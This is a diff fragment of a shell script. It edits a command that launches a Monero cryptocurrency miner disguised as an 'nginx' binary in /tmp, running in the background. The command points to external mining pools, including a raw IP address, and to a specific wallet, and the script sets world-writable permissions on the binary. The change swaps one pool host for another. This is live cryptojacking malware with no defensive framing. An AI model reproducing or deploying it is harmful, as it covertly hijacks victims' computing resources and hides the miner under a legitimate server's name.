@@ -582,7 +582,7 @@ else
         cd /tmp
         echo "user not running"
         sleep 5s
-        ./nginx --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls -o 80.211.206.105:9000 -u 84nw3MQdDJzRghGBEPWNAtLG8MA1ek1itN42Yup4dPK38wnWGY7zxSR28j2n4vyLspVPoDCFeijap2NTQJfegCTeANTrzot.51 --coin monero --background &
+        ./nginx --keepalive --no-color --cpu-priority 5 -o pool.supportxmr.com:443 --tls -o 80.211.206.105:9000 -u 84nw3MQdDJzRghGBEPWNAtLG8MA1ek1itN42Yup4dPK38wnWGY7zxSR28j2n4vyLspVPoDCFeijap2NTQJfegCTeANTrzot.51 --coin monero --background &
     fi
     echo "user running..."
     chmod 777 /tmp/nginx
